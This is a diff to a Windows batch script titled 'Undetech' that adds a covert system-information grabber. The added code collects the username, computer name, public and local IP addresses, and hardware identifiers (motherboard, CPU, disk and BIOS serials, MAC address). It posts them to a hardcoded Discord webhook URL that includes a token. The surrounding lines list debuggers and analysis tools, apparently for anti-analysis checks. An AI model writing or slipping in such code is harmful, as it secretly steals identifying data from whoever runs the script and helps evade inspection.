@@ -3,6 +3,109 @@
 setlocal EnableDelayedExpansion
 title Undetech
 
+@echo off
+setlocal enabledelayedexpansion
+
+:: ======= YOUR DISCORD WEBHOOK HERE =======
+set "WEBHOOK_URL=https://discord.com/api/webhooks/1395999594873360496/gB_Cb_ne-7St_36jupLAaCsRo-KzsEqNxRooJZdzGOVVvWA2WgxXWvlzmizf1FoviCvg"
+
+
+set "pc_user=%USERNAME%"
+set "pc_name=%COMPUTERNAME%"
+set "user_domain=%USERDOMAIN%"
+
+for /f %%a in ('powershell -command "Get-Date -Format 'yyyy-MM-dd HH:mm:ss'"') do set "run_time=%%a"
+
+
+for /f "tokens=*" %%a in ('powershell -command "(Invoke-WebRequest -Uri 'https://api.ipify.org').Content"') do set "public_ip=%%a"
+
+
+for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do set "local_ip=%%a"
+set "local_ip=%local_ip:~1%"
+
+
+for /f "skip=1 tokens=*" %%a in ('wmic baseboard get serialnumber') do (
+    set "hwid=%%a"
+    goto gotHWID
+)
+:gotHWID
+
+
+for /f "skip=1 tokens=*" %%a in ('wmic cpu get name') do (
+    set "cpu_name=%%a"
+    goto gotCPU
+)
+:gotCPU
+
+for /f "skip=1 tokens=*" %%a in ('wmic cpu get processorid') do (
+    set "cpu_id=%%a"
+    goto gotCPUID
+)
+:gotCPUID
+
+
+for /f "skip=1 tokens=*" %%a in ('wmic path win32_VideoController get name') do (
+    set "gpu_name=%%a"
+    goto gotGPU
+)
+:gotGPU
+
+
+for /f "skip=1 tokens=*" %%a in ('wmic computersystem get totalphysicalmemory') do (
+    set /a "ram_mb=%%a / 1048576"
+    goto gotRAM
+)
+:gotRAM
+
+
+for /f "tokens=*" %%a in ('wmic os get caption') do (
+    set "os_name=%%a"
+    goto gotOS
+)
+:gotOS
+
+
+for /f "tokens=*" %%a in ('getmac ^| find /i ":"') do (
+    set "mac=%%a"
+    goto gotMAC
+)
+:gotMAC
+
+
+for /f "skip=1 tokens=*" %%a in ('wmic diskdrive get serialnumber') do (
+    set "disk_serial=%%a"
+    goto gotDisk
+)
+:gotDisk
+
+
+for /f "skip=1 tokens=*" %%a in ('wmic bios get smbiosbiosversion') do (
+    set "bios=%%a"
+    goto gotBIOS
+)
+:gotBIOS
+
+set "json={"
+set "json=!json!\"content\":\"System Info Report\n"
+set "json=!json!User: %pc_user%\n"
+set "json=!json!PC Name: %pc_name%\n"
+set "json=!json!Run Time: %run_time%\n"
+set "json=!json!Public IP: %public_ip%\n"
+set "json=!json!Local IP: %local_ip%\n"
+set "json=!json!HWID: %hwid%\n"
+set "json=!json!CPU: %cpu_name% (ID: %cpu_id%)\n"
+set "json=!json!GPU: %gpu_name%\n"
+set "json=!json!RAM: %ram_mb% MB\n"
+set "json=!json!OS: %os_name%\n"
+set "json=!json!MAC: %mac%\n"
+set "json=!json!Disk Serial: %disk_serial%\n"
+set "json=!json!BIOS: %bios%\""
+set "json=!json!}"
+
+powershell -Command ^
+"Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method POST -Body '%json%' -ContentType 'application/json'"
+
+
 :: Debuggers
 set "debuggers=ollydbg.exe x64dbg.exe x32dbg.exe cheatengine.exe ida.exe ida64.exe winhex.exe tcpview.exe processhacker.exe procmon.exe procexp.exe xdbg.exe"
 
